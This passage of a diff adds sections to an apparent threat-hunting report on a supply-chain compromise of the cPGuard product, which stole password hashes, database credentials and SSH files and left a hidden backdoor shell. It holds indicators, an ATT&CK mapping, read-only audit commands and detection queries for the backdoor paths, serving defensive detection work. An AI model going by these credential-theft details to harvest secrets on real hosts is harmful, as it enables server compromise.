+<tr><td>6</td><td>Hidden root backdoor shell left at /var/tmp/.cpg91511_sh</td><td>Process creation; executable written</td><td>Q2, Q3</td></tr>
+<tr><td>7</td><td>Attacker later retrieves the data from the licensing server and may use hashes and keys</td><td>Outside endpoint telemetry (vendor server; later logons need sshd or authentication logs)</td><td>Section 7 log checks; credential rotation</td></tr>
+</table>
+    </div>
+  </div>
+
+  <div class="section" id="s4">
+    <div class="section-hdr"><span class="snum">04</span><h2>Consolidated IOC Table</h2></div>
+    <div class="section-body">
+<table>
+<tr><th>Type</th><th>Value</th><th>Confidence</th><th>Action</th><th>Context</th></tr>
+<tr><td>filename</td><td><code>cpguard-v58812-i91511.sh</code></td><td><span class="badge b-low">high</span></td><td>detect</td><td>Malicious script (OPSSHIELD advisory; The Hacker News)</td></tr>
+<tr><td>path</td><td><code>/var/tmp/.cpg91511_sh</code></td><td><span class="badge b-low">high</span></td><td>detect</td><td>Backdoor shell removed by the corrective update (advisory; The Hacker News; SecurityOnline)</td></tr>
+<tr><td>path</td><td><code>/var/tmp/.cpg91511</code></td><td><span class="badge b-low">high</span></td><td>detect</td><td>Collection directory (advisory; The Hacker News)</td></tr>
+<tr><td>path</td><td><code>/var/tmp/.cpg91511/loot.tgz</code></td><td><span class="badge b-low">high</span></td><td>detect</td><td>Archive staged by the script (advisory; The Hacker News)</td></tr>
+<tr><td>sha256</td><td><code>REPLACE_WITH_SCRIPT_SHA256</code></td><td><span class="badge b-high">placeholder</span></td><td>detect</td><td>No hash published; fill from a preserved copy</td></tr>
+<tr><td>sha256</td><td><code>REPLACE_WITH_BACKDOOR_SHELL_SHA256</code></td><td><span class="badge b-high">placeholder</span></td><td>detect</td><td>No hash published; fill from a preserved copy</td></tr>
+<tr><td>domain</td><td><code>REPLACE_WITH_LICENSING_SERVER_DOMAIN</code></td><td><span class="badge b-high">placeholder</span></td><td>detect</td><td>Upload point; hostname not published and legitimate for normal licensing</td></tr>
+<tr><td>evidence file</td><td><code>/opt/cpguard/logs/install_log</code></td><td>n/a</td><td>enrich</td><td>Legitimate product log used for the exposure check; not an indicator</td></tr>
+</table>
+<p class="callout callout-warn">Four sourced indicators, three placeholders. cpgcli, <code>/opt/cpguard/</code> and the cPGuard binaries are legitimate product files: they are context only and never ship as prevent. No IP addresses are published; the version numbers 5.88.12 to 5.88.19 and 5.88.25 are not indicators.</p>
+    </div>
+  </div>
+
+  <div class="section" id="s5">
+    <div class="section-hdr"><span class="snum">05</span><h2>Affected Surface &amp; Telemetry Matrix</h2></div>
+    <div class="section-body">
+<table>
+<tr><th>Surface</th><th>Telemetry</th><th>Priority</th><th>Gap</th></tr>
+<tr><td>Linux hosting servers running cPGuard (cPanel and other Linux hosting)</td><td>Process creation with command line, path and parent (CrowdStrike: ProcessRollup2, SyntheticProcessRollup2. SentinelOne: Process Creation. Defender: DeviceProcessEvents)</td><td><span class="badge b-high">High</span></td><td>Sensor must be on the server; shell builtin reads and in-process activity produce no event</td></tr>
+<tr><td>Hidden executables under /var/tmp</td><td>Executable written (CrowdStrike: ElfFileWritten. SentinelOne: File Creation. Defender: DeviceFileEvents FileCreated)</td><td><span class="badge b-med">Medium</span></td><td>Non-executable files such as loot.tgz and a script backdoor are not reported as executables</td></tr>
+<tr><td>Upload to the licensing server</td><td>DNS lookup (CrowdStrike: DnsRequest. SentinelOne: DNS Resolved. Defender: DeviceEvents DnsQueryResponse); outbound connection (CrowdStrike: NetworkConnectIP4. SentinelOne: IP Connect. Defender: DeviceNetworkEvents)</td><td><span class="badge b-med">Medium</span></td><td>Hostname unpublished; destination is a legitimate vendor host</td></tr>
+<tr><td>Update history and product log</td><td>File content on disk (/opt/cpguard/logs/install_log); no endpoint event carries it</td><td><span class="badge b-high">High</span></td><td>Outside endpoint telemetry: use the Section 7 shell check, RTR or a configuration tool</td></tr>
+<tr><td>Downstream credential use (SSH, database, S3, DigitalOcean)</td><td>Authentication logs, database logs, cloud audit logs</td><td><span class="badge b-high">High</span></td><td>Outside endpoint telemetry</td></tr>
+</table>
+    </div>
+  </div>
+
+  <div class="section" id="s6">
+    <div class="section-hdr"><span class="snum">06</span><h2>ATT&amp;CK Mapping</h2></div>
+    <div class="section-body">
+<table>
+<tr><th>Tactic</th><th>Technique</th><th>Observed Behavior</th><th>Query / Control</th></tr>
+<tr><td>Initial Access</td><td>T1195.002 Compromise Software Supply Chain</td><td>Malicious script delivered through the vendor update channel</td><td>Q1, Q8; Section 12 items 1, 5</td></tr>
+<tr><td>Execution</td><td>T1059.004 Unix Shell</td><td>Shell script and backdoor shell</td><td>Q1, Q2</td></tr>
+<tr><td>Defense Evasion</td><td>T1564.001 Hidden Files and Directories</td><td>Dot-prefixed /var/tmp/.cpg91511 and .cpg91511_sh</td><td>Q2, Q3</td></tr>
+<tr><td>Credential Access</td><td>T1003.008 /etc/passwd and /etc/shadow</td><td>Password hashes collected</td><td>Q4; Section 12 items 2, 6</td></tr>
+<tr><td>Credential Access</td><td>T1552.001 Credentials In Files</td><td>Root my.cnf collected</td><td>Q4; Section 12 item 8</td></tr>
+<tr><td>Credential Access</td><td>T1552.003 Shell History</td><td>Root shell history collected (secrets recorded in it)</td><td>Q4; Section 12 item 8</td></tr>
+<tr><td>Credential Access</td><td>T1552.004 Private Keys</td><td>Root SSH authorization and known-hosts files collected; private keys at risk, theft not confirmed</td><td>Q4; Section 12 item 2</td></tr>
+<tr><td>Collection</td><td>T1074.001 Local Data Staging; T1560.001 Archive via Utility</td><td>loot.tgz built in the hidden directory</td><td>Q5</td></tr>
+<tr><td>Exfiltration</td><td>T1041 Exfiltration Over C2 Channel (used loosely: upload to a vendor-controlled collection point)</td><td>Archive uploaded to the licensing server under a compromised account</td><td>Q6, Q7; Section 12 item 3</td></tr>
+</table>
+    </div>
+  </div>
+
+  <div class="section" id="s7">
+    <div class="section-hdr"><span class="snum">07</span><h2>Native Audit-Log Hunts</h2></div>
+    <div class="section-body">
+<p>These are read-only checks for each cPGuard server. The vendor says a missing or incomplete log does not show a server was unaffected, and the corrective update removes the named files.</p>
+<h3>7.1 Update history (the vendor's own check)</h3>
+<pre class="code">grep 'Successfully updated' /opt/cpguard/logs/install_log
+grep -E 'Successfully updated to 5\.88\.1[2-9]' /opt/cpguard/logs/install_log</pre>
+<p>Any entry from 5.88.12 to 5.88.19 means the server installed an affected update. The vendor's example lines show five entries on 02-11-2026 (day-first, zone unstated).</p>
+<h3>7.2 Installed version</h3>
+<pre class="code">cpgcli --version</pre>
+<p>Must report 5.88.25 or later. A fixed version does not clear a host that installed an affected one earlier.</p>
+<h3>7.3 Named artifacts</h3>
+<pre class="code"># Filesystem sweep (read-only)
+ls -la /var/tmp/.cpg91511 /var/tmp/.cpg91511_sh 2&gt;/dev/null
+find /var/tmp /tmp /root /opt/cpguard -maxdepth 3 \( -name '.cpg*' -o -name 'cpguard-v*-i*.sh' \) 2&gt;/dev/null
+stat /etc/shadow
+# Remember: the corrective update removes these files, so a clean result does not show the script never ran.</pre>
+<h3>7.4 Logons since the compromise (credentials may have been used)</h3>
+<pre class="code">last -F root | head -50
+grep -E 'Accepted (password|publickey)' /var/log/secure /var/log/auth.log 2&gt;/dev/null | tail -200
+cat /root/.ssh/authorized_keys</pre>
+<p>Look for logons you cannot explain since 2026-11-02 and for unknown keys. An OPSSHIELD support-access key is legitimate if support access was granted; OPSSHIELD is shipping an update to remove those keys.</p>
+<h3>7.5 Database and cloud audit</h3>
+<p>Review MariaDB/MySQL logs for root logins from unexpected sources, and review S3 and DigitalOcean audit logs since 2026-11-02 for the keys and tokens that were present on the server or recorded in root's shell history (the vendor names S3 access keys and DigitalOcean tokens).</p>
+    </div>
+  </div>
+
+  <div class="section" id="s8">
+    <div class="section-hdr"><span class="snum">08</span><h2 data-rosetta-original="CrowdStrike LogScale CQL Hunt Queries">Hunt Queries: CrowdStrike CQL, SentinelOne PowerQuery and Defender XDR KQL</h2></div>
+    <div class="section-body">
+<div class="rosetta-global" data-rosetta-global="true" role="group" aria-label="Show every query in one language"><span class="rosetta-global-label">Show all queries in</span><div class="rosetta-global-btns"><button type="button" class="rosetta-global-btn" data-language="cql" aria-pressed="true" onclick="rosettaSetAll('cql')">CrowdStrike · CQL</button><button type="button" class="rosetta-global-btn" data-language="powerquery" aria-pressed="false" onclick="rosettaSetAll('powerquery')">SentinelOne · PowerQuery</button><button type="button" class="rosetta-global-btn" data-language="kql" aria-pressed="false" onclick="rosettaSetAll('kql')">Defender XDR · KQL</button></div><span class="rosetta-global-mixed" hidden>Mixed: some cards were switched on their own</span></div><div class="rosetta-console" data-rosetta-console="true" hidden><div class="rosetta-console-row"><label for="rosetta-console-url">SentinelOne console:</label><input type="url" id="rosetta-console-url" placeholder="https://usea1-yourtenant.sentinelone.net" autocomplete="off" spellcheck="false" aria-describedby="rosetta-console-hint"><span class="rosetta-console-status" role="status" aria-live="polite"></span></div><p class="rosetta-console-hint" id="rosetta-console-hint">Use your tenant's own address. SentinelOne does not document a link that pre-fills a query, so each "Copy &amp; open SentinelOne" button copies the query and opens this console: paste it into PowerQuery.</p></div><div class="rosetta-console rosetta-portal" data-rosetta-portal="true" hidden><div class="rosetta-console-row"><label for="rosetta-portal-select">Microsoft Defender portal:</label><select id="rosetta-portal-select" aria-describedby="rosetta-portal-hint"><option value="https://security.microsoft.com">Commercial or GCC (security.microsoft.com)</option><option value="https://security.microsoft.us">GCC High (security.microsoft.us)</option><option value="https://security.apps.mil">DoD (security.apps.mil)</option></select></div><p class="rosetta-console-hint" id="rosetta-portal-hint">Pick your portal. Microsoft documents a Share link in advanced hunting but not its URL format, so each "Copy &amp; open Defender" button copies the query and opens Advanced hunting: paste it into the editor.</p></div>
+    <div class="cloud-sel">
+      <label for="cloud-region">Falcon cloud (drives "Open in Falcon"):</label>
+      <select id="cloud-region">
+        <option value="https://falcon.crowdstrike.com">US-1</option>
+        <option value="https://falcon.us-2.crowdstrike.com">US-2</option>
+        <option value="https://falcon.eu-1.crowdstrike.com">EU-1</option>
+        <option value="https://falcon.laggar.gcw.crowdstrike.com">US-GOV-1</option>
+        <option value="https://falcon.us-gov-2.crowdstrike.mil">US-GOV-2</option>
+      </select>
+      <span class="cloud-hint">Pick your tenant's cloud first: every "Open in Falcon" button below uses this selection.</span>
+    </div>
+
+    <div class="query-card">
+      <div class="qc-header">
+        <span class="qc-title">Q1 &middot; cPGuard update script execution (exact name and name pattern)</span>
+        <div class="qc-badges"><span class="badge b-low">CONF HIGH</span><span class="badge b-low">FP LOW</span><span class="badge b-low">COST LOW</span></div>
+        <div class="qc-actions">
+          <button class="btn-copy" onclick="copyQuery('cql1',this)">Copy CQL</button>
+          <button class="btn-falcon" onclick="openFalcon('cql1')">Open in Falcon</button>
+        </div>
+      </div>
+      <div class="qc-body">
+        <p><strong>Looks for:</strong> Looks for any Linux process whose command line names the malicious script <code>cpguard-v58812-i91511.sh</code>. The regex also matches the same <code>cpguard-v&lt;digits&gt;-i&lt;digits&gt;.sh</code> shape, because the digits look like a version and an incident id; that generalisation is a hunting heuristic, not something a source states. <strong>FP:</strong> none known for the exact name; the vendor ships no legitimate script with this name.</p>
+<div class="rosetta-query-shell" data-siem-rosetta-version="1.3" data-rosetta-query-id="cql1"><div class="rosetta-release"><span class="rosetta-badge level">Validation: schema-aligned, static-reviewed</span><span class="rosetta-badge">Automated: static-passed</span><span class="rosetta-badge">Equivalence: equivalent-with-schema-assumptions</span><span class="rosetta-badge">Profiles: microsoft-defender-xdr, sentinelone-endpoint-ocsf</span></div><details class="rosetta-details"><summary>Known limitations and deployment notes</summary><ul><li>PowerQuery: A script run by a process the agent did not observe starting is not captured.</li><li>PowerQuery assumes: endpoint.os holds the lowercase value linux.</li><li>PowerQuery assumes: The script name appears in tgt.process.cmdline when a shell interpreter runs it.</li><li>KQL – Defender XDR: A script run by a process the sensor did not observe starting is not captured.</li><li>KQL – Defender XDR assumes: DeviceProcessEvents has no operating system column, so no Linux filter is applied; the script name pattern is specific to the campaign.</li><li>KQL – Defender XDR assumes: The script name appears in ProcessCommandLine when a shell interpreter runs it.</li></ul></details><div class="rosetta-controls"><div class="rosetta-tabs" role="tablist" aria-label="SIEM query language"><button type="button" class="rosetta-tab" role="tab" id="cql1-tab" aria-controls="cql1-pane" aria-selected="true" data-language="cql" tabindex="0" onclick="rosettaSwitch(this)">CQL</button><button type="button" class="rosetta-tab" role="tab" id="powerquery1-tab" aria-controls="powerquery1-pane" aria-selected="false" data-language="powerquery" tabindex="-1" onclick="rosettaSwitch(this)">PowerQuery</button><button type="button" class="rosetta-tab" role="tab" id="kql1-tab" aria-controls="kql1-pane" aria-selected="false" data-language="kql" tabindex="-1" onclick="rosettaSwitch(this)">KQL – Defender XDR</button></div><div class="rosetta-controls-end"><button type="button" class="rosetta-open-s1" hidden onclick="rosettaOpenS1(this)" title="SentinelOne does not document a link that pre-fills a query: this copies the query and opens your console">Copy &amp; open SentinelOne</button><button type="button" class="rosetta-open-def" hidden onclick="rosettaOpenDefender(this)" title="Microsoft documents a Share link in the portal but not its URL format: this copies the query and opens Advanced hunting">Copy &amp; open Defender</button><button type="button" class="rosetta-fallback-copy" data-rosetta-copy-label="Copy CQL" onclick="rosettaCopy(this)">Copy CQL</button></div></div><div class="rosetta-pane" data-lang="cql" id="cql1-pane" role="tabpanel" aria-labelledby="cql1-tab"><pre class="cql" id="cql1"><span class="cm">// HUNT: cPGuard update channel malicious script execution</span>
+<span class="cm">// MITRE: T1195.002, T1059.004</span>
+<span class="cm">// CONF: high  FP: low  COST: low | REQUIRES: Linux process creation with command line (ProcessRollup2)</span>
+<span class="cm">// SOURCE: script filename cpguard-v58812-i91511.sh (OPSSHIELD advisory; The Hacker News)</span>
+<span class="cm">// NOTE: the pattern below also matches the same name shape with other digits (heuristic, unconfirmed)</span>
+#event_simpleName=/^(ProcessRollup2|SyntheticProcessRollup2)$/
+| event_platform=Lin
+| CommandLine=/cpguard-v\d+-i\d+\.sh/i
+| table([@timestamp, ComputerName, aid, UserName, FileName, CommandLine, ParentBaseFileName, ImageFileName, SHA256HashData])</pre></div><div class="rosetta-pane" data-lang="powerquery" id="powerquery1-pane" role="tabpanel" aria-labelledby="powerquery1-tab" hidden><details class="rosetta-requirements"><summary>3 required fields · View requirements</summary><div class="rosetta-requirements-body"><section><h4>Required telemetry</h4><ul><li>Process Creation</li></ul></section><section><h4>Required fields</h4><ul><li><code>event.type</code>: Event type</li><li><code>endpoint.os</code>: Endpoint OS</li><li><code>tgt.process.cmdline</code>: Created command line</li></ul></section><section><h4>Recommended fields</h4><ul><li><code>src.process.name</code>: Creator process</li></ul></section><section><h4>Optional fields</h4><ul><li><code>tgt.process.image.sha256</code>: Hash. Population varies by agent version.</li></ul></section><section><h4>Fallbacks</h4><ul><li><code>endpoint.name</code> → <code>agent.uuid</code>: Changes the displayed host identifier only.</li></ul></section><section class="rosetta-readiness"><div class="rosetta-readiness-head"><h4>Readiness test</h4><button type="button" class="rosetta-readiness-copy" onclick="rosettaCopyReadiness(this)">Copy readiness test</button></div><pre class="rosetta-readiness-code" data-rosetta-ignore="true">event.type = &#x27;Process Creation&#x27; endpoint.os = &#x27;linux&#x27; tgt.process.cmdline = *
+| limit 5
+| columns event.time, endpoint.name, tgt.process.cmdline</pre></section></div></details><pre class="siem-code powerquery" id="powerquery1" data-language="powerquery" data-rosetta-query-id="cql1">// HUNT: cPGuard update channel malicious script execution
+// SCHEMA PROFILE: sentinelone-endpoint-ocsf
+// MITRE: T1195.002, T1059.004
+// CONF: high | FP: low
+// EQUIVALENCE: equivalent-with-schema-assumptions - Same process-creation predicate: the update script name shape on the created process command line, Linux only. matches is case-insensitive, which reproduces the CQL /i intent. The creator is src.process.name.
+// REQUIRES: SentinelOne Deep Visibility process-creation events from Linux agents
+// TUNING: The pattern also matches the same name shape with other digits; confirm a hit against the advisory script name before acting.
+// LOOKBACK: 7d; set the console time picker, extend to 30d for the incident window
+// CONFIGURATION: No lookup objects required.
+// KNOWN GAPS: A script run by a process the agent did not observe starting is not captured.
+// VALIDATION LEVEL: static-reviewed
+event.type = &#x27;Process Creation&#x27; endpoint.os = &#x27;linux&#x27; tgt.process.cmdline matches &#x27;cpguard-v\\d+-i\\d+\\.sh&#x27;
+| columns event.time, endpoint.name, agent.uuid, src.process.user, tgt.process.name, tgt.process.cmdline, src.process.name, tgt.process.image.path, tgt.process.image.sha256
+| sort -event.time
+| limit 200</pre></div><div class="rosetta-pane" data-lang="kql" id="kql1-pane" role="tabpanel" aria-labelledby="kql1-tab" hidden><details class="rosetta-automated-validation" data-status="static-passed"><summary>Automated validation: static-passed</summary><div class="rosetta-automated-validation-body"><div>Static schema: passed (0 errors, 0 warnings)</div><div>Positive fixtures: 0/0 · Benign fixtures: 0/0</div><div>Evidence: recorded in the build's validation report (not published)</div><div>Checked: 2026-11-04T12:27:51Z · siem-query-rosetta-kql-validator/1.0.0</div></div></details><details class="rosetta-requirements"><summary>2 required fields · View requirements</summary><div class="rosetta-requirements-body"><section><h4>Required telemetry</h4><ul><li>DeviceProcessEvents</li></ul></section><section><h4>Required fields</h4><ul><li><code>Timestamp</code>: Event time</li><li><code>ProcessCommandLine</code>: Created command line</li></ul></section><section><h4>Recommended fields</h4><ul><li><code>InitiatingProcessFileName</code>: Creator process</li></ul></section><section><h4>Optional fields</h4><ul><li><code>SHA1</code>: Hash. SHA256 is often unpopulated in DeviceProcessEvents; SHA1 is the safer pivot.</li></ul></section><section><h4>Fallbacks</h4><ul><li><code>DeviceName</code> → <code>DeviceId</code>: Changes the displayed host identifier only.</li></ul></section><section class="rosetta-readiness"><div class="rosetta-readiness-head"><h4>Readiness test</h4><button type="button" class="rosetta-readiness-copy" onclick="rosettaCopyReadiness(this)">Copy readiness test</button></div><pre class="rosetta-readiness-code" data-rosetta-ignore="true">DeviceProcessEvents
+| where Timestamp &gt; ago(1d)
+| project Timestamp, FileName, ProcessCommandLine
+| take 5</pre></section></div></details><pre class="siem-code kql" id="kql1" data-language="kql" data-rosetta-query-id="cql1">// HUNT: cPGuard update channel malicious script execution
+// SCHEMA PROFILE: microsoft-defender-xdr
+// MITRE: T1195.002, T1059.004
+// CONF: high | FP: low
+// EQUIVALENCE: equivalent-with-schema-assumptions - Same process-creation predicate: the update script name shape on the created process command line. matches regex with (?i) reproduces the CQL /i intent. The creator is InitiatingProcessFileName.
+// REQUIRES: Defender for Endpoint on Linux process-creation telemetry (DeviceProcessEvents)
+// TUNING: The pattern also matches the same name shape with other digits; confirm a hit against the advisory script name before acting.
+// LOOKBACK: 7d; extend to 30d for the incident window
+// CONFIGURATION: No lookup objects required.
+// KNOWN GAPS: A script run by a process the sensor did not observe starting is not captured.
+// VALIDATION LEVEL: schema-aligned
+// AUTOMATED VALIDATION: static-passed; static=passed; fixtures=0/0
+DeviceProcessEvents
+| where Timestamp &gt;= ago(7d)
+| where ProcessCommandLine matches regex @&quot;(?i)cpguard-v\d+-i\d+\.sh&quot;
+| project Timestamp, ReportId, DeviceId, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, FolderPath, SHA1, SHA256
+| sort by Timestamp desc
+| take 200</pre></div></div>
+      </div>
+    </div>
+    <div class="query-card">
+      <div class="qc-header">
+        <span class="qc-title">Q2 &middot; Hidden backdoor shell and collection directory execution under /var/tmp</span>
+        <div class="qc-badges"><span class="badge b-low">CONF HIGH</span><span class="badge b-low">FP LOW</span><span class="badge b-low">COST LOW</span></div>
+        <div class="qc-actions">
+          <button class="btn-copy" onclick="copyQuery('cql2',this)">Copy CQL</button>
+          <button class="btn-falcon" onclick="openFalcon('cql2')">Open in Falcon</button>
+        </div>
+      </div>
+      <div class="qc-body">
+        <p><strong>Looks for:</strong> Looks for execution of the hidden backdoor shell <code>/var/tmp/.cpg91511_sh</code> or anything run from, or pointed at, the hidden collection directory <code>/var/tmp/.cpg91511</code>. The basename match uses <code>FileName</code> with no path slash; the command-line branch escapes the slash. The digits are generalised to <code>\d+</code> (heuristic). <strong>FP:</strong> none known.</p>
+<div class="rosetta-query-shell" data-siem-rosetta-version="1.3" data-rosetta-query-id="cql2"><div class="rosetta-release"><span class="rosetta-badge level">Validation: schema-aligned, static-reviewed</span><span class="rosetta-badge">Automated: static-passed</span><span class="rosetta-badge">Equivalence: equivalent-with-schema-assumptions</span><span class="rosetta-badge">Profiles: microsoft-defender-xdr, sentinelone-endpoint-ocsf</span></div><details class="rosetta-details"><summary>Known limitations and deployment notes</summary><ul><li>PowerQuery: Files deleted by the corrective update leave no process event to find after the fact.</li><li>PowerQuery assumes: endpoint.os holds the lowercase value linux.</li><li>PowerQuery assumes: tgt.process.name holds the basename of the executed file.</li><li>KQL – Defender XDR: Files deleted by the corrective update leave no process event to find after the fact.</li><li>KQL – Defender XDR assumes: DeviceProcessEvents has no operating system column, so no Linux filter is applied; the dot-prefixed path pattern is specific to the campaign.</li><li>KQL – Defender XDR assumes: FileName holds the basename of the executed file.</li></ul></details><div class="rosetta-controls"><div class="rosetta-tabs" role="tablist" aria-label="SIEM query language"><button type="button" class="rosetta-tab" role="tab" id="cql2-tab" aria-controls="cql2-pane" aria-selected="true" data-language="cql" tabindex="0" onclick="rosettaSwitch(this)">CQL</button><button type="button" class="rosetta-tab" role="tab" id="powerquery2-tab" aria-controls="powerquery2-pane" aria-selected="false" data-language="powerquery" tabindex="-1" onclick="rosettaSwitch(this)">PowerQuery</button><button type="button" class="rosetta-tab" role="tab" id="kql2-tab" aria-controls="kql2-pane" aria-selected="false" data-language="kql" tabindex="-1" onclick="rosettaSwitch(this)">KQL – Defender XDR</button></div><div class="rosetta-controls-end"><button type="button" class="rosetta-open-s1" hidden onclick="rosettaOpenS1(this)" title="SentinelOne does not document a link that pre-fills a query: this copies the query and opens your console">Copy &amp; open SentinelOne</button><button type="button" class="rosetta-open-def" hidden onclick="rosettaOpenDefender(this)" title="Microsoft documents a Share link in the portal but not its URL format: this copies the query and opens Advanced hunting">Copy &amp; open Defender</button><button type="button" class="rosetta-fallback-copy" data-rosetta-copy-label="Copy CQL" onclick="rosettaCopy(this)">Copy CQL</button></div></div><div class="rosetta-pane" data-lang="cql" id="cql2-pane" role="tabpanel" aria-labelledby="cql2-tab"><pre class="cql" id="cql2"><span class="cm">// HUNT: cPGuard hidden backdoor shell or collection directory in use</span>
+<span class="cm">// MITRE: T1564.001, T1059.004</span>
+<span class="cm">// CONF: high  FP: low  COST: low | REQUIRES: Linux process creation with command line (ProcessRollup2)</span>
+<span class="cm">// SOURCE: /var/tmp/.cpg91511_sh and /var/tmp/.cpg91511 (OPSSHIELD advisory; The Hacker News; SecurityOnline for the shell)</span>
+<span class="cm">// NOTE: absence proves nothing, the corrective update deletes these files</span>
+#event_simpleName=/^(ProcessRollup2|SyntheticProcessRollup2)$/
+| event_platform=Lin
+| FileName=/^\.cpg\d+_sh$/i or CommandLine=/\/var\/tmp\/\.cpg\d+/i
+| table([@timestamp, ComputerName, aid, UserName, FileName, CommandLine, ParentBaseFileName, ImageFileName, SHA256HashData])</pre></div><div class="rosetta-pane" data-lang="powerquery" id="powerquery2-pane" role="tabpanel" aria-labelledby="powerquery2-tab" hidden><details class="rosetta-requirements"><summary>4 required fields · View requirements</summary><div class="rosetta-requirements-body"><section><h4>Required telemetry</h4><ul><li>Process Creation</li></ul></section><section><h4>Required fields</h4><ul><li><code>event.type</code>: Event type</li><li><code>endpoint.os</code>: Endpoint OS</li><li><code>tgt.process.name</code>: Created process name</li><li><code>tgt.process.cmdline</code>: Created command line</li></ul></section><section><h4>Recommended fields</h4><ul><li><code>src.process.name</code>: Creator process</li></ul></section><section><h4>Optional fields</h4><ul><li><code>tgt.process.image.sha256</code>: Hash. Population varies by agent version.</li></ul></section><section><h4>Fallbacks</h4><ul><li><code>endpoint.name</code> → <code>agent.uuid</code>: Changes the displayed host identifier only.</li></ul></section><section class="rosetta-readiness"><div class="rosetta-readiness-head"><h4>Readiness test</h4><button type="button" class="rosetta-readiness-copy" onclick="rosettaCopyReadiness(this)">Copy readiness test</button></div><pre class="rosetta-readiness-code" data-rosetta-ignore="true">event.type = &#x27;Process Creation&#x27; endpoint.os = &#x27;linux&#x27; tgt.process.name = * tgt.process.cmdline = *
+| limit 5
+| columns event.time, endpoint.name, tgt.process.name, tgt.process.cmdline</pre></section></div></details><pre class="siem-code powerquery" id="powerquery2" data-language="powerquery" data-rosetta-query-id="cql2">// HUNT: cPGuard hidden backdoor shell or collection directory in use
+// SCHEMA PROFILE: sentinelone-endpoint-ocsf
+// MITRE: T1564.001, T1059.004
+// CONF: high | FP: low
+// EQUIVALENCE: equivalent-with-schema-assumptions - Same process-creation predicate: the hidden shell by created process name, or the hidden collection directory on the command line. matches is case-insensitive, which reproduces the CQL /i intent.
+// REQUIRES: SentinelOne Deep Visibility process-creation events from Linux agents
+// TUNING: None needed for the exact backdoor path; absence proves nothing because the corrective update deletes these files.
+// LOOKBACK: 7d; set the console time picker, extend to 30d for the incident window
+// CONFIGURATION: No lookup objects required.
+// KNOWN GAPS: Files deleted by the corrective update leave no process event to find after the fact.
+// VALIDATION LEVEL: static-reviewed
+event.type = &#x27;Process Creation&#x27; endpoint.os = &#x27;linux&#x27; (tgt.process.name matches &#x27;^\\.cpg\\d+_sh$&#x27; or tgt.process.cmdline matches &#x27;/var/tmp/\\.cpg\\d+&#x27;)
+| columns event.time, endpoint.name, agent.uuid, src.process.user, tgt.process.name, tgt.process.cmdline, src.process.name, tgt.process.image.path, tgt.process.image.sha256
+| sort -event.time
+| limit 200</pre></div><div class="rosetta-pane" data-lang="kql" id="kql2-pane" role="tabpanel" aria-labelledby="kql2-tab" hidden><details class="rosetta-automated-validation" data-status="static-passed"><summary>Automated validation: static-passed</summary><div class="rosetta-automated-validation-body"><div>Static schema: passed (0 errors, 0 warnings)</div><div>Positive fixtures: 0/0 · Benign fixtures: 0/0</div><div>Evidence: recorded in the build's validation report (not published)</div><div>Checked: 2026-11-04T12:27:51Z · siem-query-rosetta-kql-validator/1.0.0</div></div></details><details class="rosetta-requirements"><summary>3 required fields · View requirements</summary><div class="rosetta-requirements-body"><section><h4>Required telemetry</h4><ul><li>DeviceProcessEvents</li></ul></section><section><h4>Required fields</h4><ul><li><code>Timestamp</code>: Event time</li><li><code>FileName</code>: Created process name</li><li><code>ProcessCommandLine</code>: Created command line</li></ul></section><section><h4>Recommended fields</h4><ul><li><code>InitiatingProcessFileName</code>: Creator process</li></ul></section><section><h4>Optional fields</h4><ul><li><code>SHA1</code>: Hash. SHA256 is often unpopulated in DeviceProcessEvents; SHA1 is the safer pivot.</li></ul></section><section><h4>Fallbacks</h4><ul><li><code>DeviceName</code> → <code>DeviceId</code>: Changes the displayed host identifier only.</li></ul></section><section class="rosetta-readiness"><div class="rosetta-readiness-head"><h4>Readiness test</h4><button type="button" class="rosetta-readiness-copy" onclick="rosettaCopyReadiness(this)">Copy readiness test</button></div><pre class="rosetta-readiness-code" data-rosetta-ignore="true">DeviceProcessEvents
+| where Timestamp &gt; ago(1d)
+| project Timestamp, FileName, ProcessCommandLine
+| take 5</pre></section></div></details><pre class="siem-code kql" id="kql2" data-language="kql" data-rosetta-query-id="cql2">// HUNT: cPGuard hidden backdoor shell or collection directory in use
+// SCHEMA PROFILE: microsoft-defender-xdr
+// MITRE: T1564.001, T1059.004
+// CONF: high | FP: low
+// EQUIVALENCE: equivalent-with-schema-assumptions - Same process-creation predicate: the hidden shell by created process name, or the hidden collection directory on the command line. matches regex with (?i) reproduces the CQL /i intent.
+// REQUIRES: Defender for Endpoint on Linux process-creation telemetry (DeviceProcessEvents)
+// TUNING: None needed for the exact backdoor path; absence proves nothing because the corrective update deletes these files.
+// LOOKBACK: 7d; extend to 30d for the incident window
+// CONFIGURATION: No lookup objects required.
+// KNOWN GAPS: Files deleted by the corrective update leave no process event to find after the fact.
+// VALIDATION LEVEL: schema-aligned
+// AUTOMATED VALIDATION: static-passed; static=passed; fixtures=0/0
+DeviceProcessEvents
+| where Timestamp &gt;= ago(7d)
+| where FileName matches regex @&quot;(?i)^\.cpg\d+_sh$&quot; or ProcessCommandLine matches regex @&quot;(?i)/var/tmp/\.cpg\d+&quot;
+| project Timestamp, ReportId, DeviceId, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, FolderPath, SHA1, SHA256
+| sort by Timestamp desc
+| take 200</pre></div></div>
+      </div>
+    </div>
+    <div class="query-card">
+      <div class="qc-header">
+        <span class="qc-title">Q3 &middot; Hidden executable written under /var/tmp (ElfFileWritten)</span>
+        <div class="qc-badges"><span class="badge b-med">CONF MEDIUM</span><span class="badge b-med">FP MEDIUM</span><span class="badge b-low">COST LOW</span></div>
+        <div class="qc-actions">
+          <button class="btn-copy" onclick="copyQuery('cql3',this)">Copy CQL</button>
+          <button class="btn-falcon" onclick="openFalcon('cql3')">Open in Falcon</button>
+        </div>
+      </div>
+      <div class="qc-body">
+        <p><strong>Looks for:</strong> Looks for Linux executables written to the hidden <code>/var/tmp/.cpg&lt;digits&gt;</code> paths named by the vendor, plus any hidden dotfile executable written directly under <code>/var/tmp</code>. The backdoor shell may be a copied shell binary (not stated by any source), which is why this watches executable writes. <strong>FP:</strong> the second branch is generic and can match installers that unpack hidden helpers into <code>/var/tmp</code>; the cPGuard-specific first branch should not.</p>
